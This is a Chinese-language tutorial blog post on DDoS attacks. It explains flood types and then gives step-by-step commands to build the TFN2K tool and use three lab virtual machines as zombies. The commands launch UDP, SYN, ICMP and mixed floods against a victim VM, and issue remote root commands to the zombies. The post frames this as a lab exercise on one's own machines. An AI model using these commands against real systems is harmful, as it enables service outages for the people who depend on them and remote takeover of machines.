---
title: "DDOS 工具 TFN2K 教學"
subtitle: ""
excerpt: "ddos tfn2k"
layout: post
author: "blueskyson"
header-style: text
tags:
  - linux
---

請使用自己的電腦測試，不要攻擊其他人或做犯罪行為

## DDOS 簡介

「阻斷服務攻擊」（denial-of-service attack, **DoS**）亦稱洪水攻擊，是一種網路攻擊手法，主要的目的是讓目標電腦的網路或者系統資源耗盡，使其服務中斷且無法正常存取

使用兩個或以上的電腦為攻擊端作為「**Zombies** 殭屍」向特定「**Victims** 目標」發動阻斷式服務攻擊時，便稱為「分散式阻斷服務攻擊」（distributed denial-of-service attack, **DDOS**）

阻斷服務攻擊可帶來的影響如 :
- 網路速度緩慢 
- 網站無法存取
- 垃圾郵件數量劇增
- 無線或有線網路連接異常斷開
- 長時間嘗試存取網站或任何網際網路服務時被拒絕
- 伺服器容易斷線，卡頓
- 對相關網域下的其他電腦造成網路連接癱瘓

## 攻擊方式

### 頻寬消耗型

目的在於放大流量限制受害者系統的頻寬；其特點是利用殭屍程式通過偽造的源 IP (即攻擊目標 IP) 向某些存在漏洞的伺服器傳送請求，伺服器在處理請求後向偽造的源 IP 傳送應答，由於這些服務的特殊性導致應答包比請求包更長，因此使用少量的寬頻就能使伺服器傳送大量的應答到目標主機上

- **UDP洪水攻擊（User Datagram Protocol floods）**  
  UDP是一種無連接協定，當封包通過UDP傳送時，所有的封包在傳送和接受時不需要進行驗證。當大量封包傳送給受害系統時，可能會導致頻寬飽和從而使得服務以及存取系統無法正常運作

- **死亡之Ping （Ping of Death）**  
  死亡之Ping是產生超過IP協定所能容忍的封包數，若系統沒有檢查機制，就會當機。傳送的IP封包大小不能超過65535字節，所以攻擊者會把封包分割後再傳送，而目標電腦接收到後會重組封包，就會遇到緩衝區溢出

### 資源消耗型

目的在消耗被攻擊者記憶體、處理器資源的攻擊手段

- **TCP/SYN洪水攻擊(Transmission Control Protocol SYN Flood)**  
  TCP是一種連接導向的協定，通常使用「三向交握」的形式：傳輸端發送SYN訊號要求連接，接收端收到後回傳SYN-ACK訊號表示收到請求，傳輸端收到後再發送ACK訊號表示連接成立。

  此種攻擊方式則是發送偽造的SYN訊號，讓接收端對假的位置回傳SYN-ACK訊號，因此接收端將永遠不會接收到ACK；此時接收端會有一部份記憶體被占用來嘗試重新發送SYN-ACK訊號。在大量封包的情況下會使接收端的記憶體和處理器資源耗盡

## TFN2K

**tfn2k** (Tribe Flood Network 2k Edition)：

用於向指定伺服器發送大量請求，以執行DDoS動作的工具。可進行的攻擊包括：  
TCP(SYN) Flood、UDP Flood、ICMP Flood、Smurf Attack。

## 搭建平台

四台 VirtualBox 虛擬機，三台作為 zombie，一台為 victim

- 系統: Ubuntu 20.04
- CPU: Intel i7-10750H x 2 core
- 記憶體: 4 GiB
- 網路1: 使用 "NAT" 讓虛擬機對外連線
- 網路2: 使用 "僅限主機介面卡" 讓虛擬機形成內部網路
  ![](https://raw.githubusercontent.com/blueskyson/image-host/master/tfn2k/2.png)

## 安裝 TFN2K

從 github 下載 TFN2K，進入 `src` 目錄，使用 `make` 編譯程式，編譯前需要同意使用聲明，並且要求設置 tfn2k 的密碼，這個密碼不需要記得，因為原始碼裡將密碼驗證的 flag 註解掉了。

```non
$ git clone https://github.com/mohammad0021/TFN2K
$ cd TFN2K/src
$ make
```

編譯完成後會有兩個執行檔，`td` (tfn-daemon)、`tfn` (tfn-client)。修改 `td` 的權限然後執行 `td`

```non
$ sudo chmod 755 td
$ sudo ./td
```

利用 `sudo ps -ef | grep tfn` 檢查 daemon 是否順利啟動

```non
$ sudo ps -ef | grep tfn
root        4586    1005  0 19:30 pts/0    00:00:00 tfn-daemon
lin         6988    3118  0 20:19 pts/0    00:00:00 grep --color=auto tfn
```

## TFN2K 使用方式

首先進入 TFN2K 的目錄

```non
$ cd TFN2K/src
```

將參與 ddos 的 zombie 的僅限主機介面卡 IP 儲存成文字檔，以換行字元分隔每個 IP:

```non
$ cat hosts.txt
192.168.56.110
192.168.56.111
192.168.56.112
```

假設受害者為 192.168.56.113，接下來用以下指令進行攻擊，每個指令以 `-c` 指定攻擊模式

- UDP flood  
  ```non
  $ sudo ./tfn -f hosts.txt -c 4 -i 192.168.56.113
  ```

- TCP/SYN flood  
  ```non
  $ sudo ./tfn -f hosts.txt -c 5 -i 192.168.56.113 -p 80
  ```

- ICMP/PING flood (死亡之 ping)  
  ```non
  $ sudo ./tfn -f hosts.txt -c 6 -i 192.168.56.113
  ```

- MIX flood (UDP/TCP/ICMP interchanged)  
  ```non
  $ sudo ./tfn -f hosts.txt -c 7 -i 192.168.56.113
  ```

當攻擊完成，使用以下指令來結束 hosts.txt 中所有 Zombie 的攻擊

```non
$ sudo ./tfn -f hosts.txt -c 0
```

以上便是 tfn2k 基本操作

---

假設 victim 不只一台，則 `-i` 參數後面使用格式 `victim1@victim2@...victimN@`，例如

```non
$ sudo ./tfn -f hosts.txt -c 7 -i 192.168.56.113@192.168.56.118@
```

使用 `-c 2` 可以更改封包大小，例如:

```non
$ sudo ./tfn -f hosts.txt -c 2 -i 4096
```

使用 `-c 10` 可以對遠端以 root 權限下指令，在原始碼中以 `system()` 實現

```non
$ sudo ./tfn -f hosts.txt -c 10 -i "mkdir test"
```

## 實測

**從攻擊開始後，Zombie 傳送的資料從 0 mb/s 暴增到 5 mb/s**

![](https://raw.githubusercontent.com/blueskyson/image-host/master/tfn2k/3.png)

**以兩台 zombie 、使用 ICMP flooding 攻擊為例，Victim 接收到的封包從 0 mb/s 增為 8 mb/s，ping www.google.com 的封包掉落率為 64%**

![](https://raw.githubusercontent.com/blueskyson/image-host/master/tfn2k/4.png)

**來回通訊延遲 rtt (ms)**

![](https://raw.githubusercontent.com/blueskyson/image-host/master/tfn2k/5.png)

**封包掉落率 (%)**

![](https://raw.githubusercontent.com/blueskyson/image-host/master/tfn2k/6.png)

## 參考資料

- [阻斷服務攻擊](https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A)